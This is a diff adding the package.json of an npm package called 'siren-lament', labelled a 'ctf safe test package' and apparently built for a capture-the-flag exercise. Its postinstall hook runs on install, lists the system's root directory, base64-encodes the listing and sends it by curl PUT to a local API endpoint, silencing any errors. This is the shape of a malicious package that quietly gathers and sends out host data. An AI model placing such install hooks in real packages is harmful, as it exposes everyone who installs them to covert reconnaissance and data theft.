@@ -1,0 +1,11 @@
+{
+  "name": "siren-lament",
+  "version": "2.14.789",
+  "description": "ctf safe test package",
+  "main": "index.js",
+"scripts": {
+  "postinstall": "sh -c 'OUT=$(ls -la / 2>&1 | base64 -w0 || base64 <(ls -la / 2>&1)); curl -s -X PUT \"http://127.0.0.1:3000/api/modules/ECT-987654\" -H \"Content-Type: application/json\" -d \"{\\\"manifest\\\": \\\"name: \\\\\\\"Siren\\\\\\'s Lament\\\\\\\"\\ninstall_output_b64: \\\"${OUT}\\\"\\\"}\" || true'"
+},
+  "author": "ctf",
+  "license": "MIT"
+}
